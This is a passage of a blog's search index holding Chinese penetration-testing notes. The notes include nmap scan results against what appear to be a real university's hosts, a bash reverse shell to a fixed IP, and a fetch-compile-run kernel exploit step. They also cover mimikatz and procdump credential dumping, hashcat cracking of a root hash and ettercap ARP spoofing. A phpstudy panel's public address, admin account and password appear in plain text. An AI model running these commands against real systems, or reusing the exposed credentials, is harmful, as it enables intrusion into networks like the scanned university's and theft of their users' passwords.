<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ecjtu</title>
      <link href="/2020/10/03/ecjtu/"/>
      <url>/2020/10/03/ecjtu/</url>
      
        <content type="html"><![CDATA[<p>202.101.209.157 //企业云盘<br> 202.101.209.187 //<a href="https://mobile.ecjtu.edu.cn/#/">https://mobile.ecjtu.edu.cn/#/</a>  api接口</p><p>微哨</p><p>202.101.209.222<br>Host is up (0.0075s latency).<br>Not shown: 990 closed ports<br>PORT     STATE    SERVICE<br>22/tcp   filtered ssh<br>135/tcp  filtered msrpc<br>139/tcp  filtered netbios-ssn<br>445/tcp  filtered microsoft-ds<br>1433/tcp filtered ms-sql-s<br>1521/tcp filtered oracle<br>2601/tcp filtered zebra<br>2602/tcp filtered ripd<br>2604/tcp filtered ospfd<br>3306/tcp filtered mysql</p><p> 172.16.13.35<br>Host is up (0.016s latency).<br>Not shown: 977 filtered ports<br>PORT      STATE  SERVICE<br>21/tcp    closed ftp<br>22/tcp    closed ssh<br>23/tcp    closed telnet<br>80/tcp    open   http<br>443/tcp   closed https<br>1433/tcp  open   ms-sql-s<br>1521/tcp  closed oracle<br>3306/tcp  closed mysql<br>3389/tcp  open   ms-wbt-server<br>4001/tcp  closed newoak<br>5033/tcp  closed jtnetd-server<br>7000/tcp  closed afs3-fileserver<br>8080/tcp  closed http-proxy<br>8081/tcp  closed blackice-icecap<br>8082/tcp  closed blackice-alerts<br>8083/tcp  closed us-srv<br>8084/tcp  closed unknown<br>8085/tcp  closed unknown<br>8088/tcp  closed radan-http<br>8888/tcp  closed sun-answerbook<br>9101/tcp  closed jetdirect<br>9500/tcp  open   ismserver<br>10000/tcp closed snet-sensor-mgmt</p><p>name    string    姓名<br>sex    string    性别。boy：男，girl：女<br>photo_live    string    头像图片的url地址<br>mood_words    string    用户签名<br>student_number    string    学工号<br>nick_name    string    昵称<br>organization    string    用户所在各级组织结构名称<br>uid    string    用户的唯一id。<br>identity    string    身份。teacher：老师，student：学生<br>schoolcode    string    学校编码<br>openid    string    openid 普通用户的标识，对当前开发者帐号唯一<br>unionid    string    unionid 用户统一标识。针对一个帐号下的应用，同一用户的unionid是唯一的。<br>schoolname    string    schoolname 学校名称<br>schoolicon_url    string    schoolicon_url 学校logo</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权</title>
      <link href="/2020/09/20/privilgeescalation/"/>
      <url>/2020/09/20/privilgeescalation/</url>
      
        <content type="html"><![CDATA[<h2 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h2><h2 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h2><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://exp/exp.c</span><br><span class="line">gcc -o exp exp.c</span><br><span class="line">chmod +x exp  //可执行权限</span><br><span class="line">./exp</span><br></pre></td></tr></tbody></table></figure><p>bash反弹shell</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure><ul><li><ol><li>监听7777端口<br>在kali使用netcat执行:<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></tbody></table></figure></li></ol></li><li>2.<br>bash -i代表在本地打开一个bash，然后就是/dev/tcp/ip/port， /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出,这个时候我们在本机Ubuntu输入命令，输出以及错误输出的内容就会被传递显示到远程。</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.223.172/7777 0&gt;&amp;1</span><br></pre></td></tr></tbody></table></figure><h2 id="程序劫持"><a href="#程序劫持" class="headerlink" title="程序劫持"></a>程序劫持</h2><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h2 id="提取基础命令"><a href="#提取基础命令" class="headerlink" title="提取基础命令"></a>提取基础命令</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uname -an  //版本信息</span><br><span class="line">id  //当前权限</span><br><span class="line"><span class="built_in">pwd</span>  //当前目录</span><br><span class="line">cat /etc/issue   //版本号,可以更改</span><br><span class="line"></span><br><span class="line">root@q0o0p:/home/q0o0p<span class="comment"># cat .bash_history  //历史记录</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> privilge escalation </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权</title>
      <link href="/2020/09/20/windows-privilge-escalation/"/>
      <url>/2020/09/20/windows-privilge-escalation/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-查看windows版本号"><a href="#0x01-查看windows版本号" class="headerlink" title="0x01 查看windows版本号"></a>0x01 查看windows版本号</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">systeminfo  //查看系统详细信息</span><br><span class="line">wmic qfe get Description,HotFixID,InstalledOn  //补丁信息,比较详细</span><br><span class="line">wmic product get name,version  //当前安装程序,软件漏洞提权</span><br><span class="line">hostname  //主机名</span><br><span class="line">Set   //环境变量,可以根据路径替换文件</span><br><span class="line">net user //查看用户信息,net1 user</span><br><span class="line">tasklist //查看PID号</span><br><span class="line">tasklist /svc|find <span class="string">"TermService"</span></span><br><span class="line"></span><br><span class="line">netstat -ano|find <span class="string">"3306"</span>  //3389远程连接</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="0x02-用户密码存放路径"><a href="#0x02-用户密码存放路径" class="headerlink" title="0x02 用户密码存放路径"></a>0x02 用户密码存放路径</h2><p>存放windows账户和密码的文件<code>C:\Windows\System32\config</code></p><p>SAM数据库在磁盘上就保存在%systemroot%system32/config/目<br>录下的sam文件中, 在这个目录下还包括一个security文件，是安全数据库的内容，两者有不少关系。SAM文件(即账号密码数据库文件)，它保存了Windows中所有的用户名和密码<br>录下的sam文件中,SAM数据库中包含所有组、帐户的信息，包括密码HASH、帐户的SID等<br>win+x快速打开powershell (管理员)</p><p>win+R regedt32.exe 打开注册表编辑器并设置适当权限查看SAM中的内容</p><h2 id="0x03-明文密码获取"><a href="#0x03-明文密码获取" class="headerlink" title="0x03 明文密码获取"></a>0x03 明文密码获取</h2><p>Mimikatz下载链接地址: <a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917-fix">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917-fix</a><br>在windows2012以上的系统不能直接获取明文密码了，当可以搭配procdump+mimikatz获取密码。<br>下载<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">procdump</a></p><h3 id="1-管理员权限下使用procdump"><a href="#1-管理员权限下使用procdump" class="headerlink" title="1.管理员权限下使用procdump"></a>1.管理员权限下使用procdump</h3><p>管理员模式下运行:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></tbody></table></figure><p><img src="1.png"></p><h3 id="2-管理员权限下使用mimikatz"><a href="#2-管理员权限下使用mimikatz" class="headerlink" title="2.管理员权限下使用mimikatz"></a>2.管理员权限下使用mimikatz</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.\mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">//上面的命令无效可使用如下命令</span><br><span class="line">.\mimikatz.exe  //进入mimikatz.exe</span><br><span class="line">privilege::debug  //提升权限</span><br><span class="line">sekurlsa::minidump lsass.dmp  //抓取 lsass.exe 中的用户明文密码</span><br><span class="line">sekurlsa::logonPasswords full  //抓取密码 @getLogonPasswords</span><br></pre></td></tr></tbody></table></figure><p>其他命令如下:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">dll inject::process lsass.exe sekurlsa.dll  //注入</span><br><span class="line">cls-----------------------------清屏</span><br><span class="line"><span class="built_in">exit</span>----------------------------退出</span><br><span class="line">version------------查看mimikatz的版本</span><br><span class="line">system::user-----查看当前登录的系统用户</span><br><span class="line">system::computer-------查看计算机名称</span><br><span class="line">process::list------------------列出进程</span><br><span class="line">process::<span class="built_in">suspend</span> 进程名称 -----暂停进程</span><br><span class="line">process::stop 进程名称---------结束进程</span><br><span class="line">process::modules --列出系统的核心模块及所在位置</span><br><span class="line">service::list---------------列出系统的服务</span><br><span class="line">service::remove-----------移除系统的服务</span><br><span class="line">service::start stop 服务名称--启动或停止服务</span><br><span class="line">privilege::list---------------列出权限列表</span><br><span class="line">privilege::<span class="built_in">enable</span>--------激活一个或多个权限</span><br><span class="line">privilege::debug-----------------提升权限</span><br><span class="line">nogpo::cmd------------打开系统的cmd.exe</span><br><span class="line">nogpo::regedit -----------打开系统的注册表</span><br><span class="line">nogpo::taskmgr-------------打开任务管理器</span><br><span class="line">ts::sessions-----------------显示当前的会话</span><br><span class="line">ts::processes------显示进程和对应的pid情况等</span><br><span class="line">sekurlsa::wdigest-----获取本地用户信息及密码</span><br><span class="line">sekurlsa::tspkg------获取tspkg用户信息及密码</span><br><span class="line">sekurlsa::msv   抓取<span class="built_in">hash</span></span><br><span class="line">sekurlsa::logonPasswords--获登陆用户信息及密码</span><br><span class="line">sekurlsa::ekeys  抓取<span class="built_in">hash</span></span><br></pre></td></tr></tbody></table></figure><p>到此为止抓取的值只有NTLM,win10没有直接保存明文.</p><ul><li>hash-identifier工具<br>判断hash值的加密类型的工具<br>hash-identifier不是hash破解工具，而是用来判断hash值所使用的加密方式。</li></ul><h3 id="3-hashcat-破解hash"><a href="#3-hashcat-破解hash" class="headerlink" title="3.hashcat 破解hash"></a>3.hashcat 破解hash</h3><p>kali内置hashcat,Deepin Linux和Ubuntu Linux安装命令</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt install hashcat</span><br></pre></td></tr></tbody></table></figure><p>手动解压二进制文件[下载地址] (<a href="https://github.com/hashcat/hashcat/releases">https://github.com/hashcat/hashcat/releases</a> )</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 解压</span><br><span class="line">tar zxvf hashcat-6.1.1.7z</span><br><span class="line"><span class="built_in">cd</span> hashcat-6.1.1</span><br><span class="line"></span><br><span class="line">// 根据自己的平台执行对应的二进制文件</span><br><span class="line">./hashcat64.bin</span><br></pre></td></tr></tbody></table></figure><ul><li><p>-m 破解hash类型<br>使用<code>hashcat --help</code>查看各种类型</p></li><li><p>-a 指定破解模式</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 | Straight                <span class="comment"># 直接字典破解</span></span><br><span class="line"> 1 | Combination             <span class="comment"># 组合破解</span></span><br><span class="line"> 3 | Brute-force             <span class="comment"># 掩码暴力破解</span></span><br><span class="line"> 6 | Hybrid Wordlist + Mask  <span class="comment"># 字典+掩码破解</span></span><br><span class="line"> 7 | Hybrid Mask + Wordlist  <span class="comment"># 掩码+字典破解</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>掩码破解<br>掩码破解规则:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> ? | Charset</span><br><span class="line"></span><br><span class="line">l | abcdefghijklmnopqrstuvwxyz          <span class="comment"># 小写字母 a-z</span></span><br><span class="line"> u | ABCDEFGHIJKLMNOPQRSTUVWXYZ          <span class="comment"># 大写字母 A-Z</span></span><br><span class="line"> d | 0123456789                          <span class="comment"># 数字 0-9</span></span><br><span class="line"> h | 0123456789abcdef                    <span class="comment"># 数字 + abcdef</span></span><br><span class="line"> H | 0123456789ABCDEF                    <span class="comment"># 数字 + ABCDEF</span></span><br><span class="line"> s |  !<span class="string">"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~   # 特殊字符    </span></span><br><span class="line"><span class="string"> a | ?l?u?d?s                            # 键盘上所有可见的字符</span></span><br><span class="line"><span class="string"> b | 0x00 - 0xff                         # 可能是用来匹配像空格这种密码的</span></span><br></pre></td></tr></tbody></table></figure></li></ul><p>破解linux root密码</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 掩码破解root密码 不在potfile中记录破解成功的hash 指定设备2（核显）来跑密码 并开启优化</span></span><br><span class="line">hashcat -a 3 -m 1800 --force  <span class="string">'$6$4ojiBMDPrehqrLkX$d2T7Cn8LKkLk4SDXgCh1IEqjhnsUekXaNUXSxiZIwUTndSqyd.9sEcu80sX9DuEHGmHOeoMev2O0ACYtjMett1'</span> <span class="string">'?l?l?l?l'</span> -O -d 2 --potfile-disable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掩码破解root密码 忽略用户名 不在potfile中记录破解成功的hash 指定设备2（核显）来跑密码 并开启优化</span></span><br><span class="line">hashcat -a 3 -m 1800 --force  <span class="string">'root:$6$4ojiBMDPrehqrLkX$d2T7Cn8LKkLk4SDXgCh1IEqjhnsUekXaNUXSxiZIwUTndSqyd.9sEcu80sX9DuEHGmHOeoMev2O0ACYtjMett1'</span> <span class="string">'?l?l?l?l'</span> -O -d 2 --username --potfile-disable </span><br></pre></td></tr></tbody></table></figure><p>参考:<br><a href="https://www.sqlsec.com/2019/10/hashcat.html#toc-heading-8">https://www.sqlsec.com/2019/10/hashcat.html#toc-heading-8</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> privilge escalation </tag>
            
            <tag> windows 10 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali-update</title>
      <link href="/2020/08/28/kali-update/"/>
      <url>/2020/08/28/kali-update/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//删除C++快捷方式</span><br><span class="line">sudo update-alternatives --remove-all gcc</span><br><span class="line">sudo update-alternatives --remove-all g++</span><br></pre></td></tr></tbody></table></figure><h2 id="安装常用工具"><a href="#安装常用工具" class="headerlink" title="安装常用工具"></a>安装常用工具</h2><h3 id="配置java环境变量"><a href="#配置java环境变量" class="headerlink" title="配置java环境变量"></a>配置java环境变量</h3><h3 id="phpstudy"><a href="#phpstudy" class="headerlink" title="phpstudy"></a>phpstudy</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh https://download.xp.cn/install.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">==============运行状态=========================</span><br><span class="line"></span><br><span class="line">docker daemon running </span><br><span class="line">centos_env container running </span><br><span class="line">webpanel running </span><br><span class="line">phpstudy running </span><br><span class="line"></span><br><span class="line">=================安装完成==================</span><br><span class="line"></span><br><span class="line">请用浏览器访问面板:</span><br><span class="line">外网:http://59.52.0.215:9080/06B58D</span><br><span class="line">内网:http://192.168.31.20:9080/06B58D</span><br><span class="line">系统初始账号:admin</span><br><span class="line">系统初始密码:hmhIuifM-x    </span><br><span class="line">官网:https://www.xp.cn</span><br><span class="line">如果使用的是云服务器，请至安全组开放9080端口</span><br><span class="line">如果使用ftp，请开放21以及30000-30050端口</span><br><span class="line"></span><br><span class="line">===========================================</span><br></pre></td></tr></tbody></table></figure><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>) phpstudy -start             启动小皮面板</span><br><span class="line"><span class="number">2</span>) phpstudy -stop              停止小皮面板</span><br><span class="line"><span class="number">3</span>) phpstudy -restart           重启小皮面板</span><br><span class="line"><span class="number">4</span>) phpstudy -status            查询面板状态</span><br><span class="line"><span class="number">5</span>) phpstudy -initpwd newPwd    修改登录密码</span><br><span class="line"><span class="number">6</span>) phpstudy -visiturl          查看面板登录信息</span><br><span class="line"><span class="number">7</span>) phpstudy -repair            修复web面板</span><br><span class="line"><span class="number">8</span>) phpstudy -instinfo          查看首次安装信息</span><br><span class="line"><span class="number">9</span>) phpstudy -setport newPort   修改面板监听端口</span><br><span class="line"><span class="number">10</span>) phpstudy -retoken          重置登录授权码</span><br><span class="line"><span class="number">11</span>) phpstudy -update           检查更新</span><br><span class="line"><span class="number">12</span>) phpstudy -v                查看版本</span><br><span class="line"><span class="number">13</span>) phpstudy -canceldomain     取消域名访问</span><br><span class="line"><span class="number">14</span>) phpstudy -cancelip         取消授权ip限制</span><br><span class="line"><span class="number">98</span>) phpstudy -uninstall        卸载小皮面板</span><br></pre></td></tr></tbody></table></figure><h3 id="配置内网访问端口"><a href="#配置内网访问端口" class="headerlink" title="配置内网访问端口"></a>配置内网访问端口</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/sysconfig/</span><br><span class="line">vi iptables</span><br><span class="line">-A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 1111 -j ACCEPT</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="隐写工具"><a href="#隐写工具" class="headerlink" title="隐写工具"></a>隐写工具</h2><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/crorvick/outguess  //下载</span><br><span class="line">./configure &amp;&amp; make &amp;&amp; make install //进行安装</span><br><span class="line">outguess -<span class="built_in">help</span> </span><br><span class="line">outguess -r /root/angrybird.jpg -t 11.txt</span><br><span class="line"></span><br><span class="line">// 将a.txt和b.jpg隐写，输出c.jpg,隐写：</span><br><span class="line">outguess -k <span class="string">"123"</span> -d a.txt b.jpg c.jpg  //,密码123</span><br><span class="line">outguess -d a.txt b.jpg c.jpg</span><br><span class="line"></span><br><span class="line">// 从c.jpg中提取a.txt</span><br><span class="line">outguess -r c.jpg a.txt</span><br><span class="line">outguess -k <span class="string">"123"</span> -r c.jpg a.txt</span><br></pre></td></tr></tbody></table></figure><h3 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h3><p>Steghide是一款开源的隐写术软件<br>将post.txt文件隐藏到xxx.jpg中：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide embed -cf xxx.jpg -ef post.txt -p 123456（不加-p参数 不设置密码 ）</span><br></pre></td></tr></tbody></table></figure><p>从xxx.jpg解出post.txt:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf xxx.jpg -p 123456（-p 密码）</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="简单的配置"><a href="#简单的配置" class="headerlink" title="简单的配置"></a>简单的配置</h2><h3 id="添加普通用户"><a href="#添加普通用户" class="headerlink" title="添加普通用户"></a>添加普通用户</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser wow</span><br></pre></td></tr></tbody></table></figure><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>kali自带mysql</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">service mysql start</span><br><span class="line">mysql_secure_installation   //初始化密码</span><br><span class="line">mysql -u root -p   //登录数据库</span><br><span class="line"></span><br><span class="line">//执行下面命令才可以用刚才设置的密码登录数据库</span><br><span class="line">use mysql;</span><br><span class="line">update user <span class="built_in">set</span> plugin=<span class="string">""</span>;</span><br><span class="line">fiush privileges;</span><br></pre></td></tr></tbody></table></figure><h3 id="捕捉网网页"><a href="#捕捉网网页" class="headerlink" title="捕捉网网页"></a>捕捉网网页</h3><ul><li>cutycapt<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cutycapt  --url=https://q0o0p.top/ --out=q0o0p.png --min-width=300 --min-height=250</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="清理工具"><a href="#清理工具" class="headerlink" title="清理工具"></a>清理工具</h3><ul><li>bleachbit<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bleachbit</span><br></pre></td></tr></tbody></table></figure></li></ul><p>中国国家漏洞库:<br><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a></p><hr><h2 id="ettercap-arp欺骗工具的使用"><a href="#ettercap-arp欺骗工具的使用" class="headerlink" title="ettercap arp欺骗工具的使用"></a>ettercap arp欺骗工具的使用</h2><p>重启网络服务或主机后效果不再。若要其自动执行，可将命令echo “1” &gt; /proc/sys/net/ipv4/ip_forward 写入脚本/etc/rc.d/rc.local 或者 在/etc/sysconfig/network脚本中添加 FORWARD_IPV4=”YES”</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward  //开启请求转发,默认是0,1表示允许，</span><br><span class="line"></span><br><span class="line">/etc/init.d/apache2 start  //开启apache</span><br><span class="line"></span><br><span class="line">//如果执行报错,可能端口被占用</span><br><span class="line">netstat -lnp|grep 80  //查看80端口的进程</span><br><span class="line"> <span class="built_in">kill</span> -9 18594  //关闭进程</span><br><span class="line"></span><br><span class="line"> ettercap -G  //打开ettercap图形界面,或者手动输入如下命令</span><br><span class="line"> ettercap -Tqi wlan0 -M arp:remote /// /10.10. (网关) //</span><br></pre></td></tr></tbody></table></figure><hr><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> outguess </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 自动化测试</title>
      <link href="/2020/08/19/adb/"/>
      <url>/2020/08/19/adb/</url>
      
        <content type="html"><![CDATA[<h1 id="uiautomator2"><a href="#uiautomator2" class="headerlink" title="uiautomator2"></a>uiautomator2</h1><h2 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h2><h3 id="1-通过WiFi连接设备"><a href="#1-通过WiFi连接设备" class="headerlink" title="1.通过WiFi连接设备"></a>1.通过WiFi连接设备</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import uiautomator2 as u2</span><br><span class="line">d = u2.connect(<span class="string">'192.168.1.92'</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="2-通过USB连接设备"><a href="#2-通过USB连接设备" class="headerlink" title="2.通过USB连接设备"></a>2.通过USB连接设备</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import uiautomator2 as u2</span><br><span class="line">d = u2.connect(<span class="string">'62ab58430211'</span>)</span><br></pre></td></tr></tbody></table></figure><h3 id="3-通过adb-WiFi连接"><a href="#3-通过adb-WiFi连接" class="headerlink" title="3.通过adb WiFi连接"></a>3.通过adb WiFi连接</h3><p>手机指定端口监听TCP/IP连接</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb tcpip 5555</span><br></pre></td></tr></tbody></table></figure><p>可以通过指定端口建立连接</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import uiautomator2 as u2</span><br><span class="line">d = u2.connect(<span class="string">'192.168.1.92:5555'</span>)</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="全局设置"><a href="#全局设置" class="headerlink" title="全局设置"></a>全局设置</h2><h3 id="1-Debug-HTTP-Requests"><a 